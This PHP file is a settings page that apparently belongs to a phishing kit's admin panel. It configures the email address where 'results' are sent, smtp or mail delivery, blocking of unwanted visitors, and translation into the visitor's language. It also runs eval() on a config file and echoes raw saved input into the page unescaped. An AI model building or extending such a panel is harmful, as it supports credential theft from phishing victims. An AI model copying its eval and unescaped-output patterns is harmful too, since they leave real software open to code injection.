<?php
require_once __DIR__ . '/../function.php';

$xconfig = false;
$actual_page = 'general';

if (file_exists($api->dir_config . '/' . $api->general_config))
{
  $xconfig = true;
  @eval(file_get_contents($api->dir_config . '/' . $api->general_config));
}

if(isset($_POST['save']))
{
	$a = $_POST['email'];
	$b = $_POST['title'];
	$c = $_POST['apikey'];
	$d = $_POST['filter'];
	$e = $_POST['blocker'];
  $f = $_POST['sending'];
  $g = $_POST['translate'];
	$api->setGeneral(array($a, $b, $c, $d, $e, $f, $g));
  $api->redirect("general?success=true");
}
?>
<?php require 'page/header.php'; ?>

<body>
	<div id="header">
		<div class="container">
			<img src="../assets/img/logo.png">
		</div>
	</div>

	<div id="main">
		<div id="tooltip_main"></div>

		<?php require 'page/sidebar.php'; ?>

		<div class="content">
			<div class="top-subhead">
				<h2>General Settings</h2>
				<div class="clear"></div>
			</div>
			<div class="full-container no-border">
				<?php
					if (isset($_GET['success']))
					{
						echo '<div class="success">Changes have been saved!</div>';
					}
				?>
					<form method="post" action="" autocomplete="off">
						<ul id="settings">
							<li>
								<div class="left">Email Result</div>
								<div class="right">
									<input type="email" name="email" <?php if($xconfig == true){ echo "value=\"$config_email\""; } ?> required>
								</div>
							</li>
							<li>
								<div class="left">Title Result</div>
								<div class="right">
									<input type="text" name="title" <?php if($xconfig == true){ echo "value=\"$config_title\""; } ?> required>
								</div>
							</li>
							<li>
								<div class="left">Apikey</div>
								<div class="right">
									<input type="text" name="apikey" <?php if($xconfig == true){ echo "value=\"$config_apikey\""; } ?> required>
								</div>
							</li>
							<li>
								<div class="left">Filter<span>Blocked visitor if fill data with bad words.</span></div>
								<div class="right">
									<select name="filter">
										<?php if($xconfig == true && $config_filter == 1){
											echo '<option value="1" selected>Enabled</option>
                      <option value="0">Disabled</option>';
										}
										else
										{
											echo '<option value="1">Enabled</option>
                      <option value="0" selected>Disabled</option>';
										}?>
									</select>
								</div>
							</li>
							<li>
								<div class="left">Blocker<span>Blocked visitor if visit with block data.</span></div>
								<div class="right">
									<select name="blocker">
										<?php if($xconfig == true && $config_blocker == 1){
											echo '<option value="1" selected>Enabled</option>
                      <option value="0">Disabled</option>';
										}
										else
										{
											echo '<option value="1">Enabled</option>
                      <option value="0" selected>Disabled</option>';
										}?>
									</select>
								</div>
							</li>
              <li>
								<div class="left">Send<span>option for you sending result.</span></div>
								<div class="right">
									<select name="sending">
										<?php if($xconfig == true && $config_smtp == 1){
											echo '<option value="1" selected>smtp</option>
                      <option value="0">mail</option>';
										}
										else
										{
											echo '<option value="1">smtp</option>
                      <option value="0" selected>mail</option>';
										}?>
									</select>
								</div>
							</li>
              <li>
								<div class="left">Translate<span>automatic translate text with visitor language.</span></div>
								<div class="right">
									<select name="translate">
										<?php if($xconfig == true && $config_translate == 1){
											echo '<option value="1" selected>Enabled</option>
                      <option value="0">Disabled</option>';
										}
										else
										{
											echo '<option value="1">Enabled</option>
                      <option value="0" selected>Disabled</option>';
										}?>
									</select>
								</div>
							</li>
						</ul>
						<br>
						<br>
						<input type="submit" name="save" value="Save changes">
					</form>
			</div>
		</div>
		<div class="clear"></div>
	</div>

	<?php require 'page/footer.php'; ?>
</body>

</html>
